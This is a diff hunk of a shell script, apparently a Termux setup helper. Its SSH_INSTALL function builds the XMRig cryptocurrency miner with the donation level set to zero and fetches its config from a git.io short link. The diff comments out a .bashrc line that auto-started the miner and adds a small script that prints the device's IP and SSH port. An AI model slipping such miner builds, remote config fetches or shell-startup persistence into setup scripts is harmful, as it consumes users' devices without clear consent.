@@ -383,7 +383,15 @@ SSH_INSTALL(){
   sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig/src/donate.h
   sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig/src/donate.h
   mkdir -p xmrig/build && cd xmrig/build && cmake .. -DWITH_HWLOC=OFF && make -j $(nproc) && wget "git.io/J3d0i" -O config.json
-  [ -e $HOME/xmrig/build/xmrig ] && echo "cd $HOME/xmrig/build && ./xmrig" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
+  #[ -e $HOME/xmrig/build/xmrig ] && echo "cd $HOME/xmrig/build && ./xmrig" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
+  
+  
+    local bin="$HOME/ip.sh"
+  cat > "$bin" <<- EOM
+#!/bin/bash
+IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/')
+INFO "SSH server running at: $IP:8022"
+EOM
   
   INFO "XMRIG create success"
 }
